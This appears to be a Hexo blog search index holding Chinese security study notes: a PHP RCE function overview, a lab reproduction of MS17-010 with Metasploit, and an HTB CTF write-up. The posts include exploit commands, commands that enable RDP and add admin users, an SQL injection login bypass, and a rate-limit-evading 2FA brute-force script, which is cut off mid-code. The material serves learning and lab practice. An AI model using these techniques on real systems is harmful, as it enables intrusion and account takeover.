<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>RCE总结</title>
    <link href="/2024/06/02/rce/"/>
    <url>/2024/06/02/rce/</url>
    
    <content type="html"><![CDATA[<p><strong>原文链接：<a href="https://paper.seebug.org/3162/">https://paper.seebug.org/3162/</a></strong></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>在计算机安全中，任意代码执行(RCE)是攻击者在目标机器或目标进程中运行攻击者选择的任何命令或代码的能力。任意代码执行漏洞是软件或硬件中允许任意代码执行的安全漏洞。设计来利用这种漏洞的程序被称为任意代码执行漏洞。通过网络(特别是通过Internet等广域网)触发任意代码执行的能力通常被称为远程代码执行(RCE)</p><h2 id="shell符号使用"><a href="#shell符号使用" class="headerlink" title="shell符号使用"></a>shell符号使用</h2><p>在执行命令当中，我们会用到很多的shell符号，符号的用法如下：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">cmd1 <span class="hljs-string">| cmd2 只执行cmd2 </span><br>cmd1 <span class="hljs-string">|| cmd2 只有当cmd1执行失败后，cmd2才被执行 </span><br>cmd1 <span class="hljs-meta">&amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2 </span><br>cmd1 <span class="hljs-meta">&amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2</span><br></code></pre></td></tr></table></figure><p>Linux中支持分号进行拼接执行：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cmd1</span> ; <span class="hljs-attribute">cmd2</span> <br></code></pre></td></tr></table></figure><p>PHP中支持<code>反引号</code>拼接执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `whoami`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常规RCE"><a href="#常规RCE" class="headerlink" title="常规RCE"></a>常规RCE</h1><h2 id="基础RCE"><a href="#基础RCE" class="headerlink" title="基础RCE"></a>基础RCE</h2><h3 id="PHP基础命令-代码执行函数"><a href="#PHP基础命令-代码执行函数" class="headerlink" title="PHP基础命令&#x2F;代码执行函数"></a>PHP基础命令&#x2F;代码执行函数</h3><p>该方式最为常见，也是最为经典的方式，开发者因为没有对命令执行函数进行过滤，导致用户可以恶意传参造成的RCE</p><p>PHP下直接执行<strong>系统命令</strong>的函数如下：</p><p><strong>exec：</strong>用于执行一个外部命令。它只返回命令的最后一行输出。可以通过一个可选的参数来获取命令的所有输出。还可以通过另一个可选的参数来获取命令的返回状态</p><p><strong>shell_exec：</strong>同样用于执行外部命令。会返回命令的完整输出作为一个字符串。不提供命令的返回状态</p><p><strong>system：</strong>也是用于执行外部命令。它会立即显示输出（适合用于产生大量输出的命令）。返回命令的最后一行输出。可以通过一个可选的参数来获取命令的返回状态</p><p><strong>passthru：</strong>用于执行外部命令，并直接将原始输出传递给浏览器。常用于执行二进制文件或者需要直接传递数据流的情况（例如，输出图像或音频流）。不返回任何输出，但可以通过一个可选的参数来获取命令的返回状态</p><p><strong>反引号：</strong>一种简便的语法，用于在PHP代码中直接执行外部命令。类似于<code>shell_exec</code>，会捕获并返回命令的完整输出</p><p><strong>popen：</strong>用于打开一个到外部命令的管道。允许你与外部命令进行读或写操作（但不同时支持两者）。返回一个文件指针，可用于进一步的 fread 或 fwrite 操作。使用 pclose 来关闭管道并获取命令的退出状态</p><p><strong>ob_start：</strong>PHP 的一个函数，用于开启输出缓冲。这意味着脚本的输出（如 echo）不会立即发送到浏览器，而是存储在内部缓冲区中。这允许在输出发送到浏览器前对其进行修改。使用 <code>ob_end_flush()</code> 来发送缓冲区内容至浏览器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;echo 1&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;echo 2&#x27;</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;echo 3&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">&#x27;echo 4&#x27;</span>);<br><span class="hljs-keyword">echo</span> `<span class="hljs-keyword">echo</span> <span class="hljs-number">5</span>`;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&#x27;echo 6&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$test</span>)&#123;<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$test</span>))&#123;<br>        <span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$test</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">pclose</span>(<span class="hljs-variable">$test</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;echo&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;7&quot;</span>;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>执行PHP代码</strong>的命令如下：</p><p><strong>eval：</strong>用于执行一个字符串作为 PHP 代码。可以执行任何有效的 PHP 代码片段。没有返回值，除非在执行的代码中明确返回</p><p><strong>assert：</strong>用于测试一个表达式是否为真。如果表达式为假，会抛出一个警告或异常（取决于 PHP 配置）。通常用于调试和测试目的</p><p><strong>注意！！！</strong>此函数在在PHP8已经被移除了，以下是官方介绍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span><span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span>|<span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$description</span> = <span class="hljs-literal">null</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>assertion可以是任何带返回值的表达式，运行后的结果用于表示断言成功还是失败。警告在 PHP 8.0.0 之前，如果assertion 是 <code>string</code>，将解释为 PHP 代码，并通过 <code>eval()</code> 执行。这个字符串将作为第三个参数传递给回调函数。这种行为在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除</p><p><strong>call_user_func：</strong>用于调用一个回调函数，该函数可以是一个函数名或闭包。可以传递多个参数给回调函数。返回回调函数的返回值。适用于动态函数调用</p><p><strong>create_function：</strong>用于创建匿名（lambda-style）函数。接受两个字符串参数：参数列表和函数体。返回一个匿名函数的引用</p><p><strong>注意！！！</strong>同assert，已在PHP7.2弃用，PHP8.0被移除</p><p><strong>array_map：</strong>用于将回调函数应用于数组的每个元素。接受一个回调函数和一个或多个数组。返回一个新数组，数组元素是回调函数应用于原始元素的结果。适用于转换或处理数组元素</p><p><strong>call_user_func_array：</strong>用于调用回调函数，并将参数作为数组传递。接受两个参数：回调函数和参数数组。返回回调函数的返回值。适用于动态参数数量的函数调用</p><p><strong>usort：</strong>用于对数组进行自定义排序，接受数组和比较函数作为参数。比较函数确定元素间的排序顺序，排序后的数组不保留原始键名。适用于根据用户定义的规则排序数组元素</p><p><strong>array_filter：</strong>用于过滤数组元素，接受数组和可选的回调函数作为参数。如果提供回调函数，仅包含回调返回真值的元素；否则，移除所有等同于false的元素。适用于基于条件移除数组中的元素</p><p><strong>array_reduce：</strong>用于迭代一个数组，并通过回调函数将数组的元素逐一减少到单一值。接受三个参数：一个数组、一个回调函数和一个可选的初始值。回调函数接受两个参数：一个是携带结果的累加器，另一个是当前数组元素。返回通过累加器得到的最终值</p><p><strong>preg_replace：</strong>用于执行正则表达式的搜索和替换。接受三个参数：模式（正则表达式）、替换值和目标字符串。可以是单个字符串或数组。返回修改后的字符串或数组。适用于基于模式匹配修改文本内容。(&#x2F;e的代码执行版本在5.6版本后被移除)</p><p><strong>$符号：</strong>在 PHP 中，<code>$&#123;&#125;</code> 语法本质上是用于复杂的变量解析，通常在字符串内用来解析变量或表达式。然而，在一些特殊情况下，如果配合 eval 或其他动态执行代码的功能，<code>$&#123;&#125;</code> 可以被用来间接执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//eval</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-comment">//assert</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//call_user_func</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&#x27;system(whoami)&#x27;</span>);<br><span class="hljs-comment">//create_function</span><br><span class="hljs-variable">$command1</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;system(whoami);&#x27;</span>);<br><span class="hljs-variable">$command1</span>();<br><span class="hljs-comment">//array_map</span><br><span class="hljs-variable">$command2</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-variable">$command2</span>);<br><span class="hljs-comment">//call_user_func_array</span><br><span class="hljs-variable">$command3</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$arguments</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$command3</span>,<span class="hljs-variable">$arguments</span>);<br><span class="hljs-comment">//usort</span><br><span class="hljs-variable">$command4</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>];<br><span class="hljs-title function_ invoke__">usort</span>(<span class="hljs-variable">$commnand4</span>,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-comment">//array_filter</span><br><span class="hljs-variable">$command5</span> = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(command5,<span class="hljs-string">&#x27;system&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MS17-010(Eternal blue永恒之蓝)漏洞复现</title>
    <link href="/2024/05/29/ms17-010/"/>
    <url>/2024/05/29/ms17-010/</url>
    
    <content type="html"><![CDATA[<h1 id="MS17-010-Eternal-blue永恒之蓝"><a href="#MS17-010-Eternal-blue永恒之蓝" class="headerlink" title="MS17-010(Eternal blue永恒之蓝)"></a>MS17-010(Eternal blue永恒之蓝)</h1><h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>永恒之蓝（EternalBlue）是一个由美国国家安全局（NSA）开发的漏洞利用工具，被用于攻击微软Windows操作系统中的漏洞。这个漏洞利用工具最初泄露于公众的是在2017年4月，因此得名“永恒之蓝”</p><p>具体来说，永恒之蓝利用了微软Windows操作系统中的一个名为MS17-010的漏洞，该漏洞存在于微软的SMBv1协议实现中。攻击者可以利用这个漏洞来远程执行恶意代码，甚至控制受感染的计算机，而无需用户交互</p><p>攻击者可以利用永恒之蓝进行各种恶意活动，包括勒索软件攻击、间谍活动、信息窃取等。该漏洞被广泛利用，导致了全球范围内的许多严重的网络安全事件，包括2017年的“想象力病毒”（WannaCry）攻击事件</p><p>微软在发现漏洞后发布了补丁来修复这个问题，并呼吁用户及时更新其系统以保护自己免受潜在的攻击。然而，由于许多用户未能及时更新其系统，永恒之蓝仍然是一个潜在的威胁，特别是对于那些运行旧版本Windows系统的用户。因此，及时更新系统补丁并采取其他安全措施仍然是保护自己免受此类攻击的最佳做法之一</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h3><p>本次的漏洞环境是上课老师提供的靶场，要求我们去扫描C段，查找存活的IP并尝试利用其存在的相关漏洞</p><p>我最初尝试使用goby进行扫描，也是最早通过它报警漏洞发现192.168.12.8的445开放，且可能存在MS17-010，之后使用nmap和fscan以及nessus扫描验证，确认192.168.12.8以及其他数十个IP存在MS17-010漏洞</p><p>nmap批量扫描：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p445 --script smb-vuln-ms17-<span class="hljs-number">010</span> <span class="hljs-number">192.168.12.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>fscan定点扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fscan -h 192.168.12.8<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>打开msfconsole终端，搜索MS17-010的相关漏洞</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17-<span class="hljs-number">010</span><br></code></pre></td></tr></table></figure><p>在搜索到的相关模块中，选择<code>exploit/windows/smb/ms17_010_eternalblue</code></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-comment">#或者</span><br><span class="hljs-keyword">use</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>设置Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>网上大多数教程中，要求设置的Payload为：<code>set payload windows/meterpreter/reverse_tcp</code> 但在我的实验环境中，使用此Payload并未成功，具体分析为：</p><p><strong>reverse_tcp：</strong>攻击机设置一个端口（LPORT）和IP（LHOST），Payload在测试机执行连接攻击机IP的端口，这时如果在攻击机监听该端口会发现测试机已经反向连接</p><p><strong>bind_tcp：</strong>攻击机设置一个端口（LPORT），Payload在测试机执行打开该端口，以便攻击机可以接入</p><p>基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST</p><p>查看需要填写的相关参数、载荷等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p>设置目标被攻击主机的IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS 被攻击机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听主机IP</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LHOST 本机<span class="hljs-comment">IP</span><br></code></pre></td></tr></table></figure><p>设置监听端口</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LPORT 本机端口<br></code></pre></td></tr></table></figure><p>开始攻击</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span><br><span class="hljs-comment">#或者</span><br>exploit<br></code></pre></td></tr></table></figure><p><strong>注意！</strong></p><p>开始攻击前，请确保本机的相关防护程序关闭，否则它们会变成内鬼</p><p><img src="/img/ms17_010_1.png" alt="ms17_010_1"></p><p>当出现<code>WIN</code>则表面漏洞利用成功</p><p><img src="/img/ms17_010_2.png" alt="ms17_010_2"></p><p>这边我尝试<code>getuid</code>查询用户，发现拿到的是系统权限</p><p>在<code>shell</code>后，查看ipconfig</p><p><img src="/img/ms17_010_3.png" alt="ms17_010_3"></p><p><img src="/img/ms17_010_4.png" alt="ms17_010_4"></p><p>使用screenshot还可以截取被攻击机器当前的屏幕截图</p><p><img src="/img/ms17_010_5.png" alt="ms17_010_5"></p><p>利用拿到的<code>shell</code>查看被攻击机器所开放的端口</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -an</span><br></code></pre></td></tr></table></figure><p>发现3389端口没有开放，手动给它打开</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">wmic RDTOGGLE WHERE ServerName=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections <span class="hljs-number">1</span><br><span class="hljs-comment">#或者</span><br>REG <span class="hljs-keyword">ADD</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></code></pre></td></tr></table></figure><p>显示<code>successful</code>即为成功</p><p>再次确认3389端口是否开启</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netstat -an|<span class="hljs-built_in">find</span> <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure><p>显示LISTENING即为监听中</p><p><strong>注意！</strong></p><p>远程桌面的默认端口是3389，为了防止管理员更改了远程端口给我们连接带来意想不到的情况，需要通过查看注册表键值确认远程桌面的端口是否为3389</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">REG</span> <span class="hljs-keyword">QUERY</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v PortNumber<br></code></pre></td></tr></table></figure><p>若出现为0xd3d为正常，0xd3d为16进制的3389</p><p>添加一个新的用户</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">用户名 密码 /add</span><br></code></pre></td></tr></table></figure><p>将新建的用户添加进管理员组</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">net localgroup administrators 用户名 /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>成功连接远程桌面</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>Windows漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB_No-Threshold</title>
    <link href="/2024/05/28/htb-WsTodo/"/>
    <url>/2024/05/28/htb-WsTodo/</url>
    
    <content type="html"><![CDATA[<h1 id="No-Threshold"><a href="#No-Threshold" class="headerlink" title="No-Threshold"></a>No-Threshold</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Prepare for the finest magic products out there. However, please be aware that we’ve implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.</p><p>为最好的魔法产品做好准备。但是，请注意，我们已经在我们的网络应用程序中实施了专门的保护咒语，以防止任何针对我们网上商店的黑魔法。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>下载题目源码进行分析，通过<code>dashboard.py</code>可知，当我们通过身份验证，便可以得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dash</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;private/dashboard.html&quot;</span>, flag=Config.FLAG)<br></code></pre></td></tr></table></figure><p>查看<code>login.py</code>若用户成功登录将被重定向到<code>/auth/verify-2fa</code>若未成功，则回到<code>public/login.html</code></p><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>但在页面点击<code>login</code>返回报错403，对其路径进行模糊测试，发现<code>//auth/login</code>可以成功绕过</p><p>尝试使用万能密码绕过登录验证，结果成功了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">username<span class="hljs-operator">=</span>admin<span class="hljs-string">&#x27;+or+&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>password<span class="hljs-operator">=</span>password<br></code></pre></td></tr></table></figure><p>成功访问到 <code>/auth/verify-2fa</code> 页面，此处因为只有四位纯数字，于是尝试使用爆破，同时由于短时间内同一IP请求次数过多将被服务器阻止，这里通过修改<code>X-Forwarded-For</code>实现每五个请求更换一个IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> concurrent. futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_combinations_in_array</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read().splitlines()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_response</span>(<span class="hljs-params">response, combination</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Invalid 2FA Code!&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Try: <span class="hljs-subst">&#123;combination&#125;</span>\n&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;GOT IT!\n2FA Code: <span class="hljs-subst">&#123;combination&#125;</span>\n<span class="hljs-subst">&#123;response.text&#125;</span>\n&#x27;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(response.text)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>(<span class="hljs-params">ip, combination, headers, url</span>):<br>    headers[<span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>] = ip<br>    data = &#123;<span class="hljs-string">&#x27;2fa-code&#x27;</span>: <span class="hljs-built_in">str</span>(combination)&#125;<br><br>    response = requests.post(url, headers=headers, data=data)<br>    handle_response(response, combination)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_all_requests</span>(<span class="hljs-params">url, combinations_array</span>):<br>    base_ip = <span class="hljs-string">&#x27;192.168.&#x27;</span><br>    current_ip_suffix = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>]<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Host&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span class="hljs-string">&#x27;en-US,en;q=0.5&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept-Encoding&#x27;</span>: <span class="hljs-string">&#x27;gzip, deflate&#x27;</span>,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046/auth/verify-2fa&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;13&#x27;</span>,<br>        <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;83.136.249.173:34046&#x27;</span>,<br>        <span class="hljs-string">&#x27;DNT&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>,<br>    &#125;<br><br>    <span class="hljs-comment"># Multi-threading requests sending (see python ThreadPoolExecutor lib for more informations)</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>        futures = []<br><br>        <span class="hljs-keyword">for</span> i, combination <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(combinations_array, start=<span class="hljs-number">1</span>):<br>            ip = base_ip + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">0</span>]) + <span class="hljs-string">&#x27;.&#x27;</span> + <span class="hljs-built_in">str</span>(current_ip_suffix[<span class="hljs-number">1</span>])<br><br>            future = executor.submit(send_request, ip, combination, headers, url)<br>            futures.append(future)<br><br>         